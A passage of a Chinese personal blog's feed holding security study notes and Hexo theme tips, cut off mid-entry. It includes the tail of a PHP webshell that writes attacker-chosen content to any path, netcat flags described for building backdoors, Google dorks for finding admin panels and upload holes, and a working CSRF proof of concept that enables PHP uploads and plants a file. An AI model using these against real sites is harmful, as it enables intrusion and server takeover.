&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpif (isset($_POST[&quot;path&quot;]) &amp;&amp; isset($_POST[&quot;comm&quot;])){    $getpath = fopen($_POST[&quot;path&quot;],&quot;a&quot;);    if(!$getpath){        echo &quot;写入失败！请换个目录试试！&quot;;    }else{        fputs($getpath,$_POST[&quot;comm&quot;]);        fclose($getpath);        echo &quot;上传: OK !&quot;;    }}?&gt;</code></pre><p><img src="/images/Web/webshell/PHP%E7%AE%80%E6%98%93%E5%B0%8F%E9%A9%AC%E7%BC%96%E5%86%99/2.png" srcset="/img/loading.gif" alt=""><br><img src="/images/Web/webshell/PHP%E7%AE%80%E6%98%93%E5%B0%8F%E9%A9%AC%E7%BC%96%E5%86%99/3.png" srcset="/img/loading.gif" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>i春秋论坛: <a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=12774&amp;highlight=编写" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=12774&amp;highlight=编写</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NetCat命令详解</title>
    <link href="/2019/08/18/Web/NetCat%E8%AF%A6%E8%A7%A3%E5%8F%82%E6%95%B0/"/>
    <url>/2019/08/18/Web/NetCat%E8%AF%A6%E8%A7%A3%E5%8F%82%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="Netcat下载"><a href="#Netcat下载" class="headerlink" title="Netcat下载"></a>Netcat下载</h2><p>下载地址：<a href="https://eternallybored.org/misc/netcat/" target="_blank" rel="noopener">https://eternallybored.org/misc/netcat/</a></p><p>Netcat 是非常简单易用的基于tcp/ip协议`(c/s模型)的”瑞士军刀”</p><h2 id="详解命令参数"><a href="#详解命令参数" class="headerlink" title="详解命令参数"></a>详解命令参数</h2><h3 id="查看命令参数"><a href="#查看命令参数" class="headerlink" title="查看命令参数"></a>查看命令参数</h3><pre><code>nc -h</code></pre><a id="more"></a><h3 id="d"><a href="#d" class="headerlink" title="-d"></a>-d</h3><p>脱离命令窗口，在后台运行，常用于后门建立过程</p><h3 id="e"><a href="#e" class="headerlink" title="-e"></a>-e</h3><p>执行某个程序，常用于后门建立</p><h3 id="G-gateway"><a href="#G-gateway" class="headerlink" title="-G gateway"></a>-G gateway</h3><p>设置网关，常用于突破内网限制</p><h3 id="g-num"><a href="#g-num" class="headerlink" title="-g num"></a>-g num</h3><p>路由跳数</p><h3 id="i-sec"><a href="#i-sec" class="headerlink" title="-i sec"></a>-i sec</h3><p>设置发送每一行数据的间隔</p><h3 id="l"><a href="#l" class="headerlink" title="-l"></a>-l</h3><p>设置NetCat处于监听状态等待连接</p><h3 id="L"><a href="#L" class="headerlink" title="-L"></a>-L</h3><p>设置NetCat处于监听状态等待连接<br>当客户端断开，服务端依旧回到等待状态</p><h3 id="n"><a href="#n" class="headerlink" title="-n"></a>-n</h3><p>设置NetCat只识别ip地址，不在进行DNS解析</p><h3 id="o-file"><a href="#o-file" class="headerlink" title="-o file"></a>-o file</h3><p>设置传输十六进制的数据</p><h3 id="p-port"><a href="#p-port" class="headerlink" title="-p port"></a>-p port</h3><p>设置本地监听的端口号</p><h3 id="r"><a href="#r" class="headerlink" title="-r"></a>-r</h3><p>设置NetCat随机化的端口号</p><h3 id="s-addr"><a href="#s-addr" class="headerlink" title="-s addr"></a>-s addr</h3><p>设置NetCat源地址</p><h3 id="t"><a href="#t" class="headerlink" title="-t"></a>-t</h3><p>回复telnet的请求数据包</p><h3 id="u"><a href="#u" class="headerlink" title="-u"></a>-u</h3><p>设置netcat使用UDP模式</p><h3 id="v"><a href="#v" class="headerlink" title="-v"></a>-v</h3><p>显示错误提示信息</p><h3 id="w-secs"><a href="#w-secs" class="headerlink" title="-w secs"></a>-w secs</h3><p>设置连接超时秒数</p><h3 id="z"><a href="#z" class="headerlink" title="-z"></a>-z</h3><p>设置扫描模式，表示发送的数据包不包含任何payload<br>加快发送速度</p><p>对于端口的设置可以是个人定制的货值是一个迭代范围m-n<br>个人定制，例如：8888<br>迭达范围：1-1000</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常用Google-hack语法</title>
    <link href="/2019/08/18/Web/Google%20hack%E8%AF%AD%E6%B3%95/"/>
    <url>/2019/08/18/Web/Google%20hack%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h3 id="intitle-搜索网页标题中包含有特定字符的网页。"><a href="#intitle-搜索网页标题中包含有特定字符的网页。" class="headerlink" title="intitle 搜索网页标题中包含有特定字符的网页。"></a><code>intitle</code> 搜索网页标题中包含有特定字符的网页。</h3><p>例如“intitle: cbi”，这样网页标题中带有cbi的网页都会被搜索出来</p><h3 id="inurl-搜索包含有特定字符的URL。"><a href="#inurl-搜索包含有特定字符的URL。" class="headerlink" title="inurl 搜索包含有特定字符的URL。"></a><code>inurl</code> 搜索包含有特定字符的URL。</h3><p>例如“inurl:cbi”，则可以找到带有cbi字符的URL</p><h3 id="intext-搜索网页正文内容中的指定字符。"><a href="#intext-搜索网页正文内容中的指定字符。" class="headerlink" title="intext 搜索网页正文内容中的指定字符。"></a><code>intext</code> 搜索网页正文内容中的指定字符。</h3><p>例如“intext:pdf”。这个语法类似我们平时在某些网站中使用的“文章内容搜索”功能</p><a id="more"></a><h3 id="Site-找到与指定网站有联系的URL。"><a href="#Site-找到与指定网站有联系的URL。" class="headerlink" title="Site 找到与指定网站有联系的URL。"></a><code>Site</code> 找到与指定网站有联系的URL。</h3><p>例如“Site：<a href="http://www.58.com”。所有和这个网站有联系的URL都会被显示" target="_blank" rel="noopener">www.58.com”。所有和这个网站有联系的URL都会被显示</a></p><h3 id="减号-要求搜索结果中不含特定查询词"><a href="#减号-要求搜索结果中不含特定查询词" class="headerlink" title="减号-要求搜索结果中不含特定查询词"></a>减号<code>-</code>要求搜索结果中不含特定查询词</h3><p>例如”intitle:小说 - 电视剧” 只会搜到小说而不会出现电视剧</p><h3 id="domain-查找跟某网站相关的信息"><a href="#domain-查找跟某网站相关的信息" class="headerlink" title="domain 查找跟某网站相关的信息"></a><code>domain</code> 查找跟某网站相关的信息</h3><p>例如”domain:<a href="http://www.google.com”" target="_blank" rel="noopener">www.google.com”</a> 查询在网站内容里面包含<a href="http://www.google.com的信息的网站" target="_blank" rel="noopener">www.google.com的信息的网站</a></p><h3 id="filetype-限制查找文件的格式内容"><a href="#filetype-限制查找文件的格式内容" class="headerlink" title="filetype 限制查找文件的格式内容"></a><code>filetype</code> 限制查找文件的格式内容</h3><p>关键字+filetype:文件格式<br>例如”电脑 + filetype:ppt”</p><h3 id="双引号-书名号-中括号-精确匹配-缩小搜索范围"><a href="#双引号-书名号-中括号-精确匹配-缩小搜索范围" class="headerlink" title="双引号,书名号,中括号 精确匹配,缩小搜索范围"></a>双引号,书名号,中括号 精确匹配,缩小搜索范围</h3><p>双引号,中括号<br>    如果输入的关键字很长，在经过搜索引擎分析后，给出的搜索结果中的关键字，可能是拆分的。<br>    对这搜索结果不满意我们可以加上 双引号(“”) 和 中括号( [] )就可以不被拆分<br>    例如 “中国黑客协会” [中国黑客协会]</p><h3 id="书名号《》"><a href="#书名号《》" class="headerlink" title="书名号《》"></a>书名号<code>《》</code></h3><p>是百度独有的一个特殊查询语法。<br>书名号出现在搜索结果中，书名号括起来的内容不会被拆分<br>书名号在某些情况(如查找常用的电影或小说)下特别有效<br>    例如 “《社交网络》”</p><h3 id="查找后台地址："><a href="#查找后台地址：" class="headerlink" title="查找后台地址："></a>查找后台地址：</h3><p>site:域名 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</p><h3 id="查找文本内容："><a href="#查找文本内容：" class="headerlink" title="查找文本内容："></a>查找文本内容：</h3><p>site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username</p><h3 id="查找可注入点："><a href="#查找可注入点：" class="headerlink" title="查找可注入点："></a>查找可注入点：</h3><p>site:域名 inurl:aspx|jsp|php|asp</p><h3 id="查找上传漏洞："><a href="#查找上传漏洞：" class="headerlink" title="查找上传漏洞："></a>查找上传漏洞：</h3><p>site:域名 inurl:file|load|editor|Files</p><h3 id="找eweb编辑器："><a href="#找eweb编辑器：" class="headerlink" title="找eweb编辑器："></a>找eweb编辑器：</h3><p>site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit</p><h3 id="存在的数据库："><a href="#存在的数据库：" class="headerlink" title="存在的数据库："></a>存在的数据库：</h3><p>site:域名 filetype:mdb|asp|#</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSRF学习笔记</title>
    <link href="/2019/08/18/Web/CSRF/"/>
    <url>/2019/08/18/Web/CSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="简介-amp-原理"><a href="#简介-amp-原理" class="headerlink" title="简介 &amp; 原理"></a>简介 &amp; 原理</h1><p>CSRF（Cross-site request Forgery）是指<code>跨站请求伪造</code>，也被成为”One Click Attack”通常缩写（CSRF或XSRF）</p><p>CSRF通过伪装成受信任用户请求信任的网站<br><code>CSRF的攻击是建立在会话之上的！</code></p><p><strong>原理</strong><br>网站的cookie在浏览器中不会过期，只要不关闭浏览器或退出登录，在这期间，攻击者发送了构造后的CSRF脚本或者包含CSRF的脚本链接，可能会执行一些用户不想操作的事情！</p><p>主要是你的浏览器正处于与此网站的会话之中，那么在你权限内可进行的操作都是合法的！</p><p>也是就：攻击者盗用了你等身份，以你的身份进行一系列的操作</p><a id="more"></a><hr><h1 id="CSRF简易利用"><a href="#CSRF简易利用" class="headerlink" title="CSRF简易利用"></a>CSRF简易利用</h1><p>找到你想要利用的功能，利用burp中的csrf-poc插件<br>进行poc的编写<br>然后保存，诱惑用户点击<br>成功<br>![](/images/Web/CSRF/burp csrf-poc.png)<br><img src="/images/Web/CSRF/html.png" srcset="/img/loading.gif" alt=""><br><img src="/images/Web/CSRF/submit.png" srcset="/img/loading.gif" alt=""><br><img src="/images/Web/CSRF/%E6%88%90%E5%8A%9F.png" srcset="/img/loading.gif" alt=""></p><hr><h1 id="CSRF之文件上传"><a href="#CSRF之文件上传" class="headerlink" title="CSRF之文件上传"></a>CSRF之文件上传</h1><p>很多时候文件上传，只有在后台才能执行，想要利用，就要突破限制可上传文件类型，只有这样才有机会利用文件上传getshell</p><pre><code>function typecheck($str_type, $uptype) {    if (empty($str_type)) return false;    $allow_type = explode(&#39;|&#39;, $str_type);    $newallowType = array();    foreach ($allow_type as $key =&gt; $allow_type) {        $allow_typefile = strtolower($allow_type);        if ($allow_typefile == &#39;php&#39;) {            continue;        }        $newallowType[$allow_type] = $allow_type;    }    if (array_key_exists($uptype, $newallowType)) {        return true;    } else {        return false;    }}</code></pre><blockquote><p>Ps：小技巧：添加文件类型时添加一个<code>.php</code>(后面有空格)的文件类型，它能绕过$all_typefile==’php’的判断，同时在写入文件的时候windows能自动忽略最后面的空格</p></blockquote><p>构造POC：<br>1.修改配置文件添加允许的上传文件类型<br>2.上传shell文件</p><pre><code>&lt;html&gt;  &lt;body&gt;    &lt;form action=&quot;http://192.168.219.129/admin/index.php?archive=management&amp;action=setsave&quot; id=&quot;CSRF&quot; method=&quot;post&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;upfile_pictype&quot; value=&quot;jpg|png|gif&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;uifile_movertype&quot; value=&quot;swf|mpg|flv|mp4&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;upfile_filetype&quot; value=&quot;zip|rar|doc|xls|php |pdf&quot;&gt;    &lt;/form&gt;    &lt;script&gt;    function submitRequest()    {        var xhr = new XMLHttpRequest();        xhr.open(&quot;POST&quot;, &quot;http://192.168.219.129/admin/index.php?archive=filemanage&amp;action=upfilesave&quot;, true);        xhr.setRequestHeader(&quot;Accept&quot;, &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;);        xhr.setRequestHeader(&quot;Accept-Language&quot;, &quot;de-de,de;q=0.8,en-us;q=0.5,en;q=0.3&quot;);        xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;multipart/form-data; boundary=---------------------------165693120326202&quot;);        xhr.withCredentials = &quot;true&quot;;        var body = &quot;-----------------------------165693120326202\r\n&quot; +          &quot;Content-Disposition: form-data; name=\&quot;path\&quot;\r\n&quot; +          &quot;\r\n&quot; +          &quot;upfile/\r\n&quot;+          &quot;-----------------------------165693120326202\r\n&quot; +          &quot;Content-Disposition: form-data; name=\&quot;MAX_FILE_SIZE\&quot;\r\n&quot; +          &quot;\r\n&quot; +          &quot;100000000\r\n&quot; +          &quot;-----------------------------165693120326202\r\n&quot; +          &quot;Content-Disposition: form-data; name=\&quot;img_width\&quot;\r\n&quot; +          &quot;\r\n&quot; +          &quot;200\r\n&quot; +          &quot;-----------------------------165693120326202\r\n&quot; +          &quot;Content-Disposition: form-data; name=\&quot;img_height\&quot;\r\n&quot; +          &quot;\r\n&quot; +          &quot;200\r\n&quot; +          &quot;-----------------------------165693120326202\r\n&quot; +          &quot;Content-Disposition: form-data; name=\&quot;filetype\&quot;\r\n&quot; +          &quot;\r\n&quot; +          &quot;file\r\n&quot; +          &quot;-----------------------------165693120326202\r\n&quot; +          &quot;Content-Disposition: form-data; name=\&quot;lng\&quot;\r\n&quot; +          &quot;\r\n&quot; +          &quot;cn\r\n&quot; +          &quot;-----------------------------165693120326202\r\n&quot; +          &quot;Content-Disposition: form-data; name=\&quot;isgetback\&quot;\r\n&quot; +          &quot;\r\n&quot; +          &quot;1\r\n&quot; +          &quot;-----------------------------165693120326202\r\n&quot; +          &quot;Content-Disposition: form-data; name=\&quot;upfilepath\&quot;; filename=\&quot;php.php \&quot;\r\n&quot; +          &quot;Content-Type: application/octet-stream\r\n&quot; +          &quot;\r\n&quot; +          &quot;&lt;?php  phpinfo(); ?&gt;\r\n&quot; +          &quot;-----------------------------165693120326202--\r\n&quot;;        var aBody = new Uint8Array(body.length);        for (var i = 0; i &lt; aBody.length; i++)          aBody[i] = body.charCodeAt(i);        xhr.send(new Blob([aBody]));    }    var f = document.getElementById(&quot;CSRF&quot;);    f.submit();    submitRequest()    &lt;/script&gt;    &lt;!--&lt;form action=&quot;#&quot;&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; onclick=&quot;submitRequest();&quot; /&gt;    &lt;/form&gt;--&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><hr><h1 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h1><ul><li>验证HTTP Referer字段</li><li>在请求地址中添加token并验证</li><li>在HTTP头中自定义属性并验证</li></ul><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/240" target="_blank" rel="noopener">https://xz.aliyun.com/t/240</a><br><a href="https://xz.aliyun.com/t/1673" target="_blank" rel="noopener">https://xz.aliyun.com/t/1673</a><br><a href="https://xz.aliyun.com/t/999" target="_blank" rel="noopener">https://xz.aliyun.com/t/999</a><br><a href="http://www.ms08067.com/" target="_blank" rel="noopener">http://www.ms08067.com/</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BurpSuite抓HTTPS数据包</title>
    <link href="/2019/08/18/Web/BurpSuite%E6%8A%93HTTPS%E6%95%B0%E6%8D%AE%E5%8C%85/"/>
    <url>/2019/08/18/Web/BurpSuite%E6%8A%93HTTPS%E6%95%B0%E6%8D%AE%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00-下载burp的内置证书"><a href="#0x00-下载burp的内置证书" class="headerlink" title="0x00 下载burp的内置证书"></a>0x00 下载burp的内置证书</h3><p>开启BurpSuite</p><p>访问<code>http://burp</code>,下载burp的内置证书<br><img src="/images/Web/BurpSuite%E6%8A%93HTTPS%E6%95%B0%E6%8D%AE%E5%8C%85/0.png" srcset="/img/loading.gif" alt=""></p><p>下载并保存到桌面</p><a id="more"></a><h3 id="0x01-导入证书"><a href="#0x01-导入证书" class="headerlink" title="0x01 导入证书"></a>0x01 导入证书</h3><p>由于我的浏览器是火狐,我这就只讲火狐的导入</p><p>Firefox——菜单——选项——隐私与安全（证书）——查看证书<br><img src="/images/web/BurpSuite%E6%8A%93HTTPS%E6%95%B0%E6%8D%AE%E5%8C%85/1.png" srcset="/img/loading.gif" alt=""></p><p>直接选导入即可<br><img src="/images/Web/BurpSuite%E6%8A%93HTTPS%E6%95%B0%E6%8D%AE%E5%8C%85/2.png" srcset="/img/loading.gif" alt=""></p><p>导入的时候,全部选信任</p><p>之后就可以抓<code>HTTPS数据包</code></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Next主题 代码段优化</title>
    <link href="/2019/08/18/Hexo/%E4%BB%A3%E7%A0%81%E5%9D%97%E4%BC%98%E5%8C%96/"/>
    <url>/2019/08/18/Hexo/%E4%BB%A3%E7%A0%81%E5%9D%97%E4%BC%98%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="代码块高亮颜色"><a href="#代码块高亮颜色" class="headerlink" title="代码块高亮颜色"></a>代码块高亮颜色</h1><p>修改<code>\source\css\_common\components\highlight\theme.styl</code></p><pre><code class="css">if $highlight_theme == &quot;normal&quot;  $highlight-background   = #1b2426  $highlight-current-line = #efefef  $highlight-selection    = #d6d6d6  $highlight-foreground   = #b9bdb6  $highlight-comment      = #8e908c  $highlight-red          = #c82829  $highlight-orange       = #f5871f  $highlight-yellow       = #eab700  $highlight-green        = #009900  $highlight-aqua         = #5ce638  $highlight-blue         = #4271ae  $highlight-purple       = #8959a8  $highlight-gutter       = {    color: #869194,    bg-color: #373b41  }</code></pre><a id="more"></a><p>你是哪个子主题就选哪个<code>if $highlight_theme == &quot;normal&quot;</code></p><h1 id="代码块-添加阴影和圆角"><a href="#代码块-添加阴影和圆角" class="headerlink" title="代码块 添加阴影和圆角"></a>代码块 添加阴影和圆角</h1><p>修改<code>\source\css\_common\components\highlight\highlight.styl</code></p><pre><code class="css">.highlight {  @extend $code-block;  // Read values from NexT config and set they as local variables to use as string variables (in any CSS section).   hexo-config(&#39;codeblock.border_radius&#39;) is a &#39;unit&#39; ? (cbradius = unit(hexo-config(&#39;codeblock.border_radius&#39;), px)) : (cbradius = 1px)   //border-radius: cbradius;+  border-radius: 8px; //圆角+  box-shadow: 0 0 10px #212529, 0 0 5px #212529; /*阴影颜色*/</code></pre><p>其他代码块的样式，你可以在<code>\theme.styl</code>文件中进行修改</p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo--Next主题优化 设置</title>
    <link href="/2019/08/18/Hexo/hexo%E9%85%8D%E7%BD%AE/"/>
    <url>/2019/08/18/Hexo/hexo%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h3 id="该文章非原创-只是为了方便下次重装后修改"><a href="#该文章非原创-只是为了方便下次重装后修改" class="headerlink" title="该文章非原创,只是为了方便下次重装后修改"></a>该文章非原创,只是为了方便下次重装后修改</h3><h3 id="0x00-添加头像-and-设置头像为圆形框"><a href="#0x00-添加头像-and-设置头像为圆形框" class="headerlink" title="0x00 添加头像 and 设置头像为圆形框"></a>0x00 添加头像 and 设置头像为圆形框</h3><h4 id="1-设置头像"><a href="#1-设置头像" class="headerlink" title="1.设置头像"></a>1.设置头像</h4><p>  打开 <code>themes/next</code> 下的  <code>_config.yml</code> 文件<br>  搜索 <code>Sidebar Avatar</code> 关键字,去掉avater前面的 <code>#</code></p><pre><code>  # Sidebar Avatar  # in theme directory(source/images): /images/avatar.jpg  # in site  directory(source/uploads): /uploads/avatar.jpg  avatar: /images/blogLogo.png</code></pre><p>  并把本地图片放入 <code>themes/next/source/images</code><br>  修改文件名为: <code>blogLogo.png</code></p><a id="more"></a><h4 id="2-设置头像边框为圆形"><a href="#2-设置头像边框为圆形" class="headerlink" title="2.设置头像边框为圆形"></a>2.设置头像边框为圆形</h4><p>  打开位于 <code>themes/next/source/css/_common/components/sidebar/</code> 下的<br>  <code>sidebar-author.syl</code> 文件,修改如下</p><pre><code>  .site-author-image {    display: block;    margin: 0 auto;    padding: $site-author-image-padding;    max-width: $site-author-image-width;    height: $site-author-image-height;    border: $site-author-image-border-width solid $site-author-image-border-color;    // 修改头像边框    border-radius: 50%;    -webkit-border-radius: 50%;    -moz-border-radius: 50%;  }</code></pre><h3 id="0x01-显示当前浏览进度"><a href="#0x01-显示当前浏览进度" class="headerlink" title="0x01 显示当前浏览进度"></a>0x01 显示当前浏览进度</h3><p>打开 <code>themes/next</code> 下的<code>_config.yml</code>,搜索关键字 <code>scrollpercent</code>,把false改为true</p><pre><code># Scroll percent label in b2t buttonscrollpercent: true</code></pre><h3 id="0x02-开启打赏功能-并修复闪动bug"><a href="#0x02-开启打赏功能-并修复闪动bug" class="headerlink" title="0x02 开启打赏功能 并修复闪动bug"></a>0x02 开启打赏功能 并修复闪动bug</h3><p>在<code>_config.yml</code>中配置图片</p><pre><code>#wechat.jpg、aipay.png图片放入themes/next/source/images中#在 _config.yml搜索 reward_commentreward_comment: 坚持原创技术分享，您的支持将鼓励我继续创作！wechatpay: /images/wechat.jpgalipay: /images/aipay.png</code></pre><p>修复闪动bug</p><p>修改<code>next/source/css/_common/components/post/post-reward.styl</code>，注释<code>wechat:hover</code>和<code>alipay:hover</code></p><pre><code>/* 注释文字闪动函数#wechat:hover p{animation: roll 0.1s infinite linear;-webkit-animation: roll 0.1s infinite linear;-moz-animation: roll 0.1s infinite linear;}#alipay:hover p{animation: roll 0.1s infinite linear;-webkit-animation: roll 0.1s infinite linear;-moz-animation: roll 0.1s infinite linear;}*/</code></pre><h3 id="0x03-设置网站的图片Favicon"><a href="#0x03-设置网站的图片Favicon" class="headerlink" title="0x03 设置网站的图片Favicon"></a>0x03 设置网站的图片Favicon</h3><p>找一张(32*32)的ico图标,并将图标名改为<code>favicon.ico</code><br>然后把图标放在<code>/themes/next/source/images</code><br>并且修改主题配置文件</p><pre><code># Put your favicon.ico into `hexo-site/source/` directory.favicon: /images/favicon.ico</code></pre><h3 id="0x04-添加顶部加载条"><a href="#0x04-添加顶部加载条" class="headerlink" title="0x04 添加顶部加载条"></a>0x04 添加顶部加载条</h3><p>打开<code>_config.yml</code>配置文件<br>改为<code>pace: true</code>即可</p><pre><code>pace: true# Themes list:#pace-theme-big-counter#pace-theme-bounce#pace-theme-barber-shop#pace-theme-center-atom#pace-theme-center-circle#pace-theme-center-radar#pace-theme-center-simple#pace-theme-corner-indicator#pace-theme-fill-left#pace-theme-flash#pace-theme-loading-bar#pace-theme-mac-osx#pace-theme-minimal# For example# pace_theme: pace-theme-center-simplepace_theme: pace-theme-flash #pace-theme-minimal</code></pre><h3 id="0x05-添加jiathis分享"><a href="#0x05-添加jiathis分享" class="headerlink" title="0x05 添加jiathis分享"></a>0x05 添加jiathis分享</h3><p>在配置文件中,jiathis为true,即可</p><pre><code># Sharejiathis: true# Warning: JiaThis does not support https.#add_this_id:</code></pre><h3 id="0x06-自定义鼠标样式"><a href="#0x06-自定义鼠标样式" class="headerlink" title="0x06 自定义鼠标样式"></a>0x06 自定义鼠标样式</h3><p>打开<code>themes/next/source/css/_custom/custom.styl</code><br>添加如下代码</p><pre><code>// 鼠标样式  * {      cursor: url(&quot;http://om8u46rmb.bkt.clouddn.com/sword2.ico&quot;),auto!important  }  :active {      cursor: url(&quot;http://om8u46rmb.bkt.clouddn.com/sword1.ico&quot;),auto!important  }</code></pre><p>其中 url 里面必须是 ico 图片，ico 图片可以上传到网上<br>然后获取外链，复制到 url 里就行了</p><h3 id="0x07-设置社交链接"><a href="#0x07-设置社交链接" class="headerlink" title="0x07 设置社交链接"></a>0x07 设置社交链接</h3><p>next 主题配置文件处<br>搜索<code>social</code></p><pre><code>social:  Github: URL  简书: URL# Social Links Icons# Icon Mapping:#   Map a menu item to a specific FontAwesome icon name.#   Key is the name of the item and value is the name of FontAwesome icon. Key is case-senstive.#   When an globe mask icon presenting up means that the item has no mapping icon.social_icons:  enable: true  icons_only: false  transition: false  # Icon Mappings.  # KeyMapsToSocialItemKey: NameOfTheIconFromFontAwesome  #E-Mail: envelope  #Google: google  Twitter: twitter</code></pre><h3 id="0x08-设置友情链接"><a href="#0x08-设置友情链接" class="headerlink" title="0x08 设置友情链接"></a>0x08 设置友情链接</h3><p>在next主题配置文件<br>搜索<code>Blog rolls</code></p><pre><code># Blogrollslinks_title: 友情链接#links_layout: block#links_layout: inlinelinks:  Java学习天地: https://wangli0.github.com  ruulai.com: https://wangli0.github.com  视听中国: https://wangli0.github.com</code></pre><h3 id="0x09-博客中插入图片"><a href="#0x09-博客中插入图片" class="headerlink" title="0x09 博客中插入图片"></a>0x09 博客中插入图片</h3><p>基本分为两种方法:</p><h4 id="1-放在本地文件"><a href="#1-放在本地文件" class="headerlink" title="1.放在本地文件"></a>1.放在本地文件</h4><p>首先在<code>username.github.i</code>o目录下确认<code>_config.yml</code>中有<code>post_asset_folder:true</code><br>在hexo目录,执行<code>$ npm install https://github.com/CodeFalling/hexo-asset-image --save</code><br>之后再使用<code>hexo new &#39;new&#39;</code>创建新博客的时候<br>会在<code>source/_posts</code> 里面创建.md文件的同时生成一个相同的名字的文件夹。把该文章中需要使用的图片放在该文件夹下即可。<br>使用的时候:<code>![“图片描述”（可以不写）](/文件夹名/你的图片名字.JPG) 例如： ！[ ] (new/text.jpg)</code></p><h4 id="2-放在网上"><a href="#2-放在网上" class="headerlink" title="2.放在网上"></a>2.放在网上</h4><p>放在七牛上，需要先注册，上传图片生成链接，直接在文章中使用链接即可。<br>也可以放在服务器上，在图片链接输入绝对路径就可以</p><h3 id="0x10-插入音乐"><a href="#0x10-插入音乐" class="headerlink" title="0x10 插入音乐"></a>0x10 插入音乐</h3><p>可以使用网易云音乐,搜索想要的歌曲，点击歌曲名字进入播放器页面，点击生成外链播放器<br>复制代码，直接粘贴到博文中即可。这样会显示一个网易的播放器<br>放在<code>layout/_macro/sidebar.swig</code>文件夹下</p><pre><code>&lt;div id=&quot;music163player&quot;&gt;    &lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=280 height=86 src=&quot;//music.163.com/outchain/player?type=2&amp;id=38358214&amp;auto=0&amp;height=66&quot;&gt;    &lt;/iframe&gt;&lt;/div&gt;</code></pre><h3 id="0x11-修改-代码块自定义样式"><a href="#0x11-修改-代码块自定义样式" class="headerlink" title="0x11 修改``代码块自定义样式"></a>0x11 修改``代码块自定义样式</h3><p>打开<code>\themes\next\source\css\_custom\custom.styl</code><br>向里面添加代码(颜色可以自定义)</p><pre><code>// Custom styles.code {    color: #ff7600;    background: #fbf7f8;    margin: 2px;}// 大代码块的自定义样式.highlight, pre {    margin: 5px 0;    padding: 5px;    border-radius: 3px;}.highlight, code, pre {    border: 1px solid #d6d6d6;}</code></pre><h3 id="0x12-绚丽的图片文字"><a href="#0x12-绚丽的图片文字" class="headerlink" title="0x12 绚丽的图片文字"></a>0x12 绚丽的图片文字</h3><p>只需要在你得文章<code>*.md</code>文件的头上添加<code>photos</code>项即可<br>然后一行添加你要展示的图片</p><pre><code>---title: 我的阅历date: 2085-01-16 07:33:44tags: [hexo]photos: - http://bruce.u.qiniudn.com/2013/11/27/reading/photos-0.jpg - http://bruce.u.qiniudn.com/2013/11/27/reading/photos-1.jpg---</code></pre><h3 id="0x13-博文压缩优化"><a href="#0x13-博文压缩优化" class="headerlink" title="0x13 博文压缩优化"></a>0x13 博文压缩优化</h3><p>安装插件</p><pre><code>npm install hexo-neat --save</code></pre><p>站点配置</p><pre><code>neat_enable: trueneat_html:  enable: true  exclude:neat_css:  enable: true  exclude:    - &#39;*.min.css&#39;neat_js:  enable: true  mangle: true  output:  compress:  exclude:    - &#39;*.min.js&#39;</code></pre><h3 id="0x14-URL链接"><a href="#0x14-URL链接" class="headerlink" title="0x14 URL链接"></a>0x14 URL链接</h3><p>安装插件</p><pre><code>npm install hexo-abbrlink --save</code></pre><p>在站点配置文件<code>_config.yml</code> 添加配置</p><pre><code># permalink: :title/permalink: archives/:abbrlink.htmlabbrlink:  alg: crc32  # 算法：crc16(default) and crc32  rep: hex    # 进制：dec(default) and hex</code></pre><blockquote><p>Ps：html前缀为：对标题+时间进行md5然后再转base64</p></blockquote><h3 id="0x15-Hexo-代码高亮"><a href="#0x15-Hexo-代码高亮" class="headerlink" title="0x15 Hexo 代码高亮"></a>0x15 Hexo 代码高亮</h3><p>安装插件</p><pre><code>npm i -S hexo-prism-plugin</code></pre><p>修改Hexo根目录<code>_config.yml</code>配置文件</p><pre><code>highlight:  enable: false</code></pre><p>添加配置</p><pre><code>prism_plugin:  mode: &#39;preprocess&#39;    # realtime/preprocess  theme: &#39;tomorrow&#39;  line_number: false    # default false  custom_css:</code></pre><h3 id="0x16-修改注释的样式"><a href="#0x16-修改注释的样式" class="headerlink" title="0x16 